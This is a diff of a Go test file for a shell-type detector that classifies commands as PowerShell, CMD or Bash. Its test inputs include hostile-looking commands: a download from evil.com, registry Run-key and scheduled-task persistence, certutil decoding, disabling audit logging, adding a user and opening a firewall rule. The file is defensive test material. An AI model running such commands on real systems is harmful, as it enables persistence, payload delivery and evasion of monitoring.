@@ -20,6 +20,7 @@ func TestDetectShellType_PowerShell(t *testing.T) {
 		{"alias nsn session", "nsn -ComputerName server01"},
 		{"alias etsn session", "etsn -ComputerName server01"},
 		{"powershell type literal", "[System.Net.WebClient]::new().DownloadFile('http://evil.com/payload.ps1','payload.ps1')"},
+		{"powershell type literal [ref] lowercase", "[ref].Assembly.GetType('System.String')"},
 		{"ConvertTo-Json", "ConvertTo-Json $data"},
 		{"Select-String", "Select-String -Pattern 'error' log.txt"},
 		{"Test-Path", "Test-Path /some/path"},
@@ -72,11 +73,14 @@ func TestDetectShellType_CMD(t *testing.T) {
 	}{
 		{"reg add", `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v evil /d calc.exe`},
 		{"schtasks create", `schtasks /create /tn Updater /tr C:\Temp\evil.exe /sc onlogon`},
+		{"schtasks .exe create", `schtasks.exe /create /tn Updater /tr C:\Temp\evil.exe /sc onlogon`},
 		{"certutil decode", `certutil -decode payload.b64 payload.exe`},
+		{"full path reg.exe add", `C:\Windows\System32\reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v evil /d calc.exe`},
+		{"quoted path reg.exe add", `'C:\Windows\System32\reg.exe' add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v evil /d calc.exe`},
 		{"auditpol set", `auditpol /set /subcategory:"Logon" /success:disable /failure:disable`},
-		{"cmdkey add", `cmdkey /add:server01 /user:admin /pass:Secret123!`},
+		{"cmdkey add", `cmdkey /add:server01 /user:admin /pass:dummy-pass-123`},
 		{"hh remote", `hh.exe http://example.com/help.chm`},
-		{"net user add", `net user evil P@ssw0rd! /add`},
+		{"net user add", `net user evil dummy-pass-456 /add`},
 		{"netsh firewall add", `netsh advfirewall firewall add rule name="evil" dir=in action=allow program="C:\\Temp\\evil.exe"`},
 		{"pcalua launch", `pcalua -a C:\\Temp\\evil.exe`},
 		{"vaultcmd list", `vaultcmd /list`},
@@ -129,6 +133,7 @@ func TestDetectShellType_Bash(t *testing.T) {
 		{"find", "find . -name '*.go'"},
 		{"cat", "cat /etc/hosts"},
 		{"curl", "curl -s https://example.com"},
+		{"grep arg that looks like cmdlet", "grep Get-Process logfile.txt"},
 		{"empty", ""},
 	}
 
@@ -149,11 +154,14 @@ func TestDetectShellType_Wrappers(t *testing.T) {
 		want    ShellType
 	}{
 		{"powershell.exe -Command", "powershell.exe -Command Get-Process", ShellPowerShell},
+		{"quoted powershell full path -Command", `'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -Command Get-Process`, ShellPowerShell},
 		{"pwsh -Command", "pwsh -Command Get-ChildItem", ShellPowerShell},
 		{"powershell bare", "powershell -NoProfile -File script.ps1", ShellPowerShell},
 		{"pwsh.exe", "pwsh.exe -ExecutionPolicy Bypass -File test.ps1", ShellPowerShell},
 		{"cmd.exe /c", "cmd.exe /c echo hello", ShellCMD},
 		{"cmd /c", "cmd /c dir", ShellCMD},
+		{"full path cmd.exe /c", `C:\Windows\System32\cmd.exe /c dir`, ShellCMD},
+		{"quoted path cmd.exe /c", `'C:\Windows\System32\cmd.exe' /c dir`, ShellCMD},
 	}
 
 	for _, tt := range tests {
